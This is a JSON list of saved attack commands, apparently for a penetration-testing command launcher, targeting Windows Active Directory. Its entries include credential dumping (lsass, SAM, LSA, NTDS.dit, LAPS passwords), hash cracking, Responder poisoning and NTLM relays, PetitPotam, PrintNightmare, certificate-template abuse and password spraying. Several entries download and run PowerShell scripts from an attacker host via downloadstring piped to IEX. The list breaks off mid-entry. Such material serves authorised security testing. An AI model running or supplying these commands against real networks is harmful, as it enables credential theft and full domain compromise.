"hashcat - NTLM", "description": "", "executable_type": "custom", "executable_path": "hashcat", "arguments": "-m 1000 -a 0 hashes <wordlist>", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": "hashcat - NTLMv1", "description": "", "executable_type": "custom", "executable_path": "hashcat", "arguments": "-m 5500 -a 0 hashes <wordlist>", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": "hashcat - NTLMv2", "description": "", "executable_type": "custom", "executable_path": "hashcat", "arguments": "-m 5600 -a 0 hashes <wordlist>", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": "hashcat - generate wordlist using rules", "description": "", "executable_type": "custom", "executable_path": "cat", "arguments": "keywords.txt | hashcat -r <rule_file> --stdout > ./<custom_wordlist>", "tags": "[\"password recovery\", \"password cracking\"]", "more_info_url": null}, {"name": "get laps passwords", "description": "", "executable_type": "custom", "executable_path": "Get-LAPSPasswords", "arguments": "-DomainController <ip_dc> -Credential <domain>\\<login> | Format-Table -AutoSize", "tags": "[\"laps\", \"password\"]", "more_info_url": null}, {"name": "get laps computer list", "description": "", "executable_type": "custom", "executable_path": "Import-Module", "arguments": ".\\LAPSToolkit.ps1;\\\nGet-LAPSComputers", "tags": "[\"laps\", \"password\"]", "more_info_url": null}, {"name": "find the list of group who can manipulate SAM data", "description": "", "executable_type": "custom", "executable_path": "Import-Module", "arguments": ".\\LAPSToolkit.ps1;\\\nFind-LAPSDelegatedGroups", "tags": "[\"laps\", \"password\"]", "more_info_url": null}, {"name": "powerview get laps password", "description": "", "executable_type": "custom", "executable_path": "Get-DomainObject", "arguments": "<computer> -Properties \"ms-mcs-AdmPwd\",name", "tags": "[\"laps\", \"password\"]", "more_info_url": null}, {"name": "metasploit get laps password", "description": "", "executable_type": "custom", "executable_path": "use", "arguments": "windows/gather/credentials/enum_laps", "tags": "[\"laps\", \"password\"]", "more_info_url": null}, {"name": "get all machine passwords", "description": "", "executable_type": "custom", "executable_path": "foreach", "arguments": "($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}", "tags": "[\"laps\", \"password\"]", "more_info_url": null}, {"name": "Lsassy basic usage with password (ip or range)", "description": "", "executable_type": "custom", "executable_path": "lsassy", "arguments": "-d <domain> -u <user> -p <password> <ip>", "tags": null, "more_info_url": null}, {"name": "Lsassy basic usage with hash (ip or range)", "description": "", "executable_type": "custom", "executable_path": "lsassy", "arguments": "-v -u <user> -H <hash> <ip>", "tags": null, "more_info_url": null}, {"name": "Lsassy basic usage with kerberos (ip or range)", "description": "", "executable_type": "custom", "executable_path": "lsassy", "arguments": "-d <domain> -u <user> -k <ip_range>", "tags": null, "more_info_url": null}, {"name": "load from remote", "description": "https://github.com/PowerShellMafia/PowerSploit/", "executable_type": "custom", "executable_path": "(new-object", "arguments": "system.net.webclient).downloadstring('http://<lhost>/powerview.ps1') | IEX", "tags": "[\"ad\", \"windows\", \"powerview\"]", "more_info_url": "https://github.com/PowerShellMafia/PowerSploit"}, {"name": "Get User from SID", "description": "", "executable_type": "custom", "executable_path": "ConvertFrom-SID", "arguments": "<sid>", "tags": "[\"ad\", \"windows\", \"powerview\"]", "more_info_url": null}, {"name": "Find user ACL ", "description": "", "executable_type": "custom", "executable_path": "Get-ObjectAcl", "arguments": "-Identity <user> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}", "tags": "[\"ad\", \"windows\", \"powerview\"]", "more_info_url": null}, {"name": "Find all domain user ACL", "description": "", "executable_type": "custom", "executable_path": "Get-DomainUser", "arguments": "| Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $(\"$env:UserDomain\\$env:Username\")) {$_}}", "tags": "[\"ad\", \"windows\", \"powerview\"]", "more_info_url": null}, {"name": "Add user DACL", "description": "", "executable_type": "custom", "executable_path": "Add-DomainObjectAcl", "arguments": "-TargetIdentity <target> -PrincipalIdentity <current_user> -Rights All", "tags": "[\"ad\", \"windows\", \"powerview\"]", "more_info_url": null}, {"name": "Find all groups our current user got access", "description": "", "executable_type": "custom", "executable_path": "Get-DomainGroup", "arguments": "| Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $(\"$env:UserDomain\\$env:Username\")) {$_}}", "tags": "[\"ad\", \"windows\", \"powerview\"]", "more_info_url": null}, {"name": "Find all users our current user got access", "description": "", "executable_type": "custom", "executable_path": "Get-DomainUser", "arguments": "| Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $(\"$env:UserDomain\\$env:Username\")) {$_}}", "tags": "[\"ad\", \"windows\", \"powerview\"]", "more_info_url": null}, {"name": "Add GenericAll to target for user", "description": "", "executable_type": "custom", "executable_path": "Add-DomainObjectAcl", "arguments": "-TargetIdentity <target> -PrincipalIdentity <user> -Rights All", "tags": "[\"ad\", \"windows\", \"powerview\"]", "more_info_url": null}, {"name": "Find all Computer with unconstrained delegation", "description": "", "executable_type": "custom", "executable_path": "Get-DomainComputer", "arguments": "-Unconstrained", "tags": "[\"ad\", \"windows\", \"powerview\"]", "more_info_url": null}, {"name": "Get group member", "description": "", "executable_type": "custom", "executable_path": "Get-DomainGroupMember", "arguments": "-Identity \"<group|Administrators>\" -Domain <domain>", "tags": "[\"ad\", \"windows\", \"powerview\"]", "more_info_url": null}, {"name": "run mitm6 (to run with impacket-ntlmrelayx)", "description": "", "executable_type": "custom", "executable_path": "mitm6", "arguments": "-d <domain>", "tags": "[\"mitm6\", \"ipv6\", \"man in the middle\"]", "more_info_url": null}, {"name": "stealty psexec", "description": "no service created, no smb used, no file dropped\nhttps://github.com/Mr-Un1k0d3r/SCShell", "executable_type": "custom", "executable_path": "python3", "arguments": "scshell.py -service-name <service-name|defragsvc> -hashes :<ntlm-hash> <domain>/<user>@<ip>", "tags": "[\"SCShell\", \"psexec\", \"sealthy\", \"DCERPC\"]", "more_info_url": "https://github.com/Mr-Un1k0d3r/SCShell"}, {"name": "Kerbrute usersenum", "description": "", "executable_type": "custom", "executable_path": "./kerbrute_linux_amd64", "arguments": "userenum -d <domain> --dc <ip> <users_file>", "tags": "[\"kerberos\"]", "more_info_url": null}, {"name": "kerberos enum users", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='<domain>'\" <ip>", "tags": "[\"kerberos\"]", "more_info_url": null}, {"name": "kerberos enum users (with user list)", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='<domain>',userdb=<users_list_file>\" <ip>", "tags": "[\"kerberos\"]", "more_info_url": null}, {"name": "kerberos ms14-068", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use auxiliary/admin/kerberos/ms14_068_kerberos_checksum\"", "tags": "[\"kerberos\"]", "more_info_url": null}, {"name": "exploit gpp - group policy preference (ms14-025)", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use scanner/smb/smb_enum_gpp\"", "tags": "[\"kerberos\"]", "more_info_url": null}, {"name": "powershell - get user SPN", "description": "https://github.com/nidem/kerberoast", "executable_type": "custom", "executable_path": "(new-object", "arguments": "system.net.webclient).downloadstring('http://<lhost>/GetUserSPNs.ps1') | IEX", "tags": "[\"kerberos\"]", "more_info_url": "https://github.com/nidem/kerberoast"}, {"name": "responder launch", "description": "", "executable_type": "custom", "executable_path": "responder", "arguments": "\u2013I eth0", "tags": "[\"responder\", \"LLMNR\", \"NBT-NS\", \"Poisoning\", \"man in the middle\"]", "more_info_url": null}, {"name": "responder launch - analyze mode (no poisoning)", "description": "", "executable_type": "custom", "executable_path": "responder", "arguments": "\u2013I eth0 -A", "tags": "[\"responder\", \"LLMNR\", \"NBT-NS\", \"Poisoning\", \"man in the middle\"]", "more_info_url": null}, {"name": "responder launch with wpad file ", "description": "", "executable_type": "custom", "executable_path": "responder", "arguments": "-I eth0 --wpad", "tags": "[\"responder\", \"LLMNR\", \"NBT-NS\", \"Poisoning\", \"man in the middle\"]", "more_info_url": null}, {"name": "responder http on", "description": "", "executable_type": "custom", "executable_path": "sed", "arguments": "-i 's/HTTP = Off/HTTP = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='", "tags": "[\"responder\", \"LLMNR\", \"NBT-NS\", \"Poisoning\", \"man in the middle\"]", "more_info_url": null}, {"name": "responder http off", "description": "", "executable_type": "custom", "executable_path": "sed", "arguments": "-i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='", "tags": "[\"responder\", \"LLMNR\", \"NBT-NS\", \"Poisoning\", \"man in the middle\"]", "more_info_url": null}, {"name": "responder smb on", "description": "", "executable_type": "custom", "executable_path": "sed", "arguments": "-i 's/SMB = Off/SMB = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='", "tags": "[\"responder\", \"LLMNR\", \"NBT-NS\", \"Poisoning\", \"man in the middle\"]", "more_info_url": null}, {"name": "responder smb off", "description": "", "executable_type": "custom", "executable_path": "sed", "arguments": "-i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='", "tags": "[\"responder\", \"LLMNR\", \"NBT-NS\", \"Poisoning\", \"man in the middle\"]", "more_info_url": null}, {"name": "multirelay attack - user filtered (previous disable HTTP and SMB in Responder.conf)", "description": "", "executable_type": "custom", "executable_path": "multirelay", "arguments": "-t <ip> -u <user1> <user2>", "tags": "[\"responder\", \"LLMNR\", \"NBT-NS\", \"Poisoning\", \"man in the middle\"]", "more_info_url": null}, {"name": "multirelay attack - all user (previous disable HTTP and SMB in Responder.conf)", "description": "", "executable_type": "custom", "executable_path": "multirelay", "arguments": "-t <ip> -u ALL", "tags": "[\"responder\", \"LLMNR\", \"NBT-NS\", \"Poisoning\", \"man in the middle\"]", "more_info_url": null}, {"name": "runfinger - Responder-related utility which will finger a single IP address or an IP subnet and will reveal if a target requires SMB Signing or not.", "description": "", "executable_type": "custom", "executable_path": "runfinger", "arguments": "-i <network_range>", "tags": "[\"responder\", \"LLMNR\", \"NBT-NS\", \"Poisoning\", \"man in the middle\"]", "more_info_url": null}, {"name": "certipy - list certificate templates", "description": "", "executable_type": "custom", "executable_path": "certipy", "arguments": "<domain>/<user>:<password>@<ip> find", "tags": "[\"adcs\", \"certificate\", \"pki\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "certipy - list vulnerables certificate templates", "description": "", "executable_type": "custom", "executable_path": "certipy", "arguments": "<domain>/<user>:<password>@<ip> find -vulnerable", "tags": "[\"adcs\", \"certificate\", \"pki\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "certipy - request certificate for self", "description": "", "executable_type": "custom", "executable_path": "certipy", "arguments": "<domain>/<user>:<password>@<ip> req -template <template> -ca <certificate_authority>", "tags": "[\"adcs\", \"certificate\", \"pki\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "certipy - request certificate for another user", "description": "", "executable_type": "custom", "executable_path": "certipy", "arguments": "<domain>/<user>:<password>@<ip> req -template <template> -ca <certificate_authority> -alt <targeted_user>", "tags": "[\"adcs\", \"certificate\", \"pki\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "certipy - pkinit with certificate and private key - generate a TGT and get NT hash", "description": "", "executable_type": "custom", "executable_path": "certipy", "arguments": "<domain>/<user>:<password>@<ip> auth -cert;\\\n<filename> -key <filename>", "tags": "[\"adcs\", \"certificate\", \"pki\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "Finding Spooler services listening", "description": "", "executable_type": "custom", "executable_path": "rpcdump.py", "arguments": "<domain>/<user>:'<password>'@<dc> | grep MS-RPRN", "tags": "[\"printerbug\", \"petitpotam\", \"Active directory\"]", "more_info_url": null}, {"name": "Finding Spooler services anonymous", "description": "", "executable_type": "custom", "executable_path": "rpcdump.py", "arguments": "<dc> | grep -A 6 MS-RPRN", "tags": "[\"printerbug\", \"petitpotam\", \"Active directory\"]", "more_info_url": null}, {"name": "dementor", "description": "https://github.com/NotMedic/NetNTLMtoSilverTicket", "executable_type": "custom", "executable_path": "dementor.py", "arguments": "-d <domain> -u <user> -p <password> <attacker_ip> <dc2>", "tags": "[\"printerbug\", \"petitpotam\", \"Active directory\"]", "more_info_url": "https://github.com/NotMedic/NetNTLMtoSilverTicket"}, {"name": "printerbug", "description": "https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py", "executable_type": "custom", "executable_path": "printerbug.py", "arguments": "'<domain>/<user>:<password>'@<ip> <attacker_ip>", "tags": "[\"printerbug\", \"petitpotam\", \"Active directory\"]", "more_info_url": "https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py"}, {"name": "webclientservicescanner", "description": "https://github.com/Hackndo/WebclientServiceScanner", "executable_type": "custom", "executable_path": "webclientservicescanner", "arguments": "'<domain>/<user>:<password>'@<ip_range>", "tags": "[\"printerbug\", \"petitpotam\", \"Active directory\"]", "more_info_url": "https://github.com/Hackndo/WebclientServiceScanner"}, {"name": "PetitPotam", "description": "https://github.com/topotam/PetitPotam", "executable_type": "custom", "executable_path": "PetitPotam.py", "arguments": "-u <user> -p '<password>' -d <domain> <listener> <target>", "tags": "[\"printerbug\", \"petitpotam\", \"Active directory\"]", "more_info_url": "https://github.com/topotam/PetitPotam"}, {"name": "ntlmrelayx add computer", "description": "", "executable_type": "custom", "executable_path": "ntlmrelayx", "arguments": "-t ldaps://<dc1> -smb2support --remove-mic --add-computer <computer_name> <computer_password> --delegate-access", "tags": "[\"printerbug\", \"petitpotam\", \"Active directory\"]", "more_info_url": null}, {"name": "use silver ticket", "description": "", "executable_type": "custom", "executable_path": "getST.py", "arguments": "-spn host/<dc2> -impersonate <user_to_impersonate> -dc-ip <dc1_ip> '<domain>/<computer_name>$:<computer_password>'", "tags": "[\"printerbug\", \"petitpotam\", \"Active directory\"]", "more_info_url": null}, {"name": "secret dump with kerberos", "description": "", "executable_type": "custom", "executable_path": "secretsdump", "arguments": "-k <dc>", "tags": "[\"printerbug\", \"petitpotam\", \"Active directory\"]", "more_info_url": null}, {"name": "PrintNightmare", "description": "https://github.com/cube0x0/CVE-2021-1675\n- windows server 2019\n  container_info['DriverInfo']['Level2']['pDriverPath']  = \"C:\\\\Windows\\\\System32\\\\DriverStore\\\\FileRepository\\\\ntprint.inf_amd64_83aa9aebf5dffc96\\\\Amd64\\\\UNIDRV.DLL\\x00\"\n- windows server 2016\n  container_info['DriverInfo']['Level2']['pDriverPath']  = \"C:\\\\Windows\\\\System32\\\\DriverStore\\\\FileRepository\\\\ntprint.inf_amd64_db4f0d0030e708f4\\\\Amd64\\\\UNIDRV.DLL\\x00\"\nNeed a real smb server (not work with the impacket server)", "executable_type": "custom", "executable_path": "CVE-2021-1675.py", "arguments": "<domain>/<user>:<password>@<target_ip> '\\\\<attacker_ip>\\<share_name>\\<dll_name|inject>.dll'", "tags": "[\"printerbug\", \"petitpotam\", \"Active directory\"]", "more_info_url": "https://github.com/cube0x0/CVE-2021-1675"}, {"name": "Printspoofer privesc", "description": "https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/PrintSpoofer.NET", "executable_type": "custom", "executable_path": "PrintSpooferNet.exe", "arguments": "\\\\.\\pipe\\test\\pipe\\spoolss <launch_cmd>", "tags": "[\"printerbug\", \"petitpotam\", \"Active directory\"]", "more_info_url": "https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/PrintSpoofer.NET"}, {"name": "Spoolsample launch pipe", "description": "", "executable_type": "custom", "executable_path": "SpoolSample.exe", "arguments": "<target_hostname> <target_hostname>/pipe/test", "tags": "[\"printerbug\", \"petitpotam\", \"Active directory\"]", "more_info_url": null}, {"name": "Spoolsample", "description": "coherced authentitication", "executable_type": "custom", "executable_path": "SpoolSample.exe", "arguments": "<target_server> <capture_server>", "tags": "[\"printerbug\", \"petitpotam\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - enumerate hosts, network", "description": "Example : cme smb 192.168.1.0/24\nhttps://mpgn.gitbook.io/crackmapexec/", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip>", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": "https://mpgn.gitbook.io/crackmapexec"}, {"name": "cme - enumerate password policy", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p '<password>' --pass-pol", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - enumerate null session", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u '' -p ''", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - enumerate anonymous login", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u 'a' -p ''", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - enumerate active sessions", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p '<password>' --sessions", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - enumerate domain users", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p '<password>' --users", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - enumerate users by bruteforce the RID", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p '<password>' --rid-brute", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - enumerate domain groups", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p '<password>' --groups", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - enumerate local groups", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p '<password>' --local-groups", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - enumerate shares", "description": "Enumerate permissions on all shares", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p <password> -d <domain> --shares", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - enumerate disks", "description": "Enumerate disks on the remote target", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p '<password>' --disks", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - enumerate smb target not signed", "description": "Maps the network of live hosts and saves a list of only the hosts that  don't require SMB signing. List format is one IP per line", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> --gen-relay-list smb_targets.txt", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - enumerate logged users", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p '<password>' --loggedon-users", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - enable wdigest", "description": "enable/disable the WDigest provider and dump clear-text credentials from LSA memory.", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - loggout user", "description": "Can be useful after enable wdigest to force user to reconnect", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p '<password>' -x 'quser';\\\ncme smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - local-auth", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p <password> --local-auth", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - local-auth with hash", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -H <hash> --local-auth", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - domain auth", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p <password> -d <domain>", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - kerberos auth", "description": "Previously import ticket :\nexport KRB5CCNAME=/tmp/ticket.ccache", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> --kerberos", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - Dump SAM", "description": "Dump SAM hashes using methods from secretsdump.py\nYou need at least local admin privilege on the remote target, use option --local-auth if your user is a local account", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p <password> -d <domain> --sam", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - Dump LSA", "description": "Dump LSA secrets using methods from secretsdump.py\nRequires Domain Admin or Local Admin Privileges on target Domain Controller", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p <password> -d <domaine> --lsa", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - dump ntds.dit", "description": "Dump the NTDS.dit from target DC using methods from secretsdump.py\nRequires Domain Admin or Local Admin Privileges on target Domain Controller", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p <password> -d <domain> --ntds", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - dump lsass", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p <password> -d <domain> -M lsassy", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - dump lsass - with bloodhond update", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - password spray (user=password)", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - password spray multiple test ", "description": "(carrefull on lockout)", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - put file", "description": "Send a local file to the remote target", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\\\Windows\\\\Temp\\\\target.txt>", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - get file", "description": "Send a local file to the remote target", "executable_type": "custom", "executable_path": "cme", "arguments": "smb <ip> -u <user> -p <password> --get-file <remote_path|\\\\Windows\\\\Temp\\\\target.txt> <local_file>", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - ASREPRoast enum without authentication", "description": "User can be a wordlist too (user.txt)\nHashcat format  -m 18200", "executable_type": "custom", "executable_path": "cme", "arguments": "ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip>", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - ASREPRoast enum with authentication", "description": "Hashcat format  -m 18200", "executable_type": "custom", "executable_path": "cme", "arguments": "ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip>", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - Kerberoasting", "description": "Hashcat format  -m 13100", "executable_type": "custom", "executable_path": "cme", "arguments": "ldap <ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_ip>", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - Unconstrained delegation", "description": "List of all computers et users with the flag TRUSTED_FOR_DELEGATION", "executable_type": "custom", "executable_path": "cme", "arguments": "ldap <ip> -u <user> -p '<password>' --trusted-for-delegation", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - winrm-auth", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "winrm <ip> -u <user> -p <password>", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - mssql password spray", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - mssql execute query", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "mssql <ip> -u <user> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "cme - mssql execute command", "description": "", "executable_type": "custom", "executable_path": "cme", "arguments": "mssql <ip> -u <user> -p '<password>' --local-auth -x <cmd|whoami>", "tags": "[\"cme\", \"crackmapexec\", \"windows\", \"Active directory\"]", "more_info_url": null}, {"name": "start neo4j server", "description": "https://neo4j.com/docs/", "executable_type": "custom", "executable_path": "neo4j", "arguments": "console start", "tags": "[\"bloodhound\", \"Active directory enumeration\"]", "more_info_url": "https://neo4j.com/docs"}, {"name": "bloodhound - collect data", "description": "https://github.com/fox-it/BloodHound.py", "executable_type": "custom", "executable_path": "bloodhound-python", "arguments": "-d <domain> -u <user> -p <password> -c all", "tags": "[\"bloodhound\", \"Active directory enumeration\"]", "more_info_url": "https://github.com/fox-it/BloodHound.py"}, {"name": "bloodhound - collect data (alternative)", "description": "https://github.com/fox-it/BloodHound.py", "executable_type": "custom", "executable_path": "bloodhound-python", "arguments": "-d <domain> -u <user> -p <password> -gc <global_catalog> -dc <domain_controler> -c all", "tags": "[\"bloodhound\", \"Active directory enumeration\"]", "more_info_url": "https://github.com/fox-it/BloodHound.py"}, {"name": "sharphound - collect bloodhound data", "description": "https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors", "executable_type": "custom", "executable_path": "import-module", "arguments": "sharphound.ps1;\\\ninvoke-bloodhound -collectionmethod all -domain <domain>", "tags": "[\"bloodhound\", \"Active directory enumeration\"]", "more_info_url": "https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors"}, {"name": "sharphound - collect bloodhound data download and execute", "description": "https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors", "executable_type": "custom", "executable_path": "(new-object", "arguments": "system.net.webclient).downloadstring('http://<lhost>/SharpHound.ps1') | Invoke-BloodHound -CollectionMethod All  -domain <domain>", "tags": "[\"bloodhound\", \"Active directory enumeration\"]", "more_info_url": "https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors"}, {"name": "cypheroth - start", "description": "Toolset that runs cypher queries against Bloodhound's Neo4j backend and saves output to spreadsheets.\nhttps://github.com/seajaysec/cypheroth", "executable_type": "custom", "executable_path": "cypheroth", "arguments": "-u <bh_user|neo4j> -p <bh_password|exegol4thewin> -d <domain>", "tags": "[\"bloodhound\", \"Active directory enumeration\"]", "more_info_url": "https://github.com/seajaysec/cypheroth"}, {"name": "aclpwn - from computer to domain - dry run", "description": "Aclpwn.py is a tool that interacts with BloodHound to identify and exploit ACL based privilege escalation paths.\nhttps://github.com/fox-it/aclpwn.py", "executable_type": "custom", "executable_path": "aclpwn", "arguments": "-f <computer_name> -ft computer -d <domain> -dry", "tags": "[\"bloodhound\", \"Active directory enumeration\"]", "more_info_url": "https://github.com/fox-it/aclpwn.py"}, {"name": "rpcclient - enumdomusers", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<password>\" -c \"enumdomusers;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - srvinfo", "description": "", "executable_type": "custom", "executable_path": "rpcclient", "arguments": "<ip> -U \"<user>%<password>\" -c \"srvinfo;quit\"", "tags": "[\"rpcclient\", \"rpc\", \"windows\"]", "more_info_url": null}, {"name": "rpcclient - get user sid", "description": "", "executable_type": 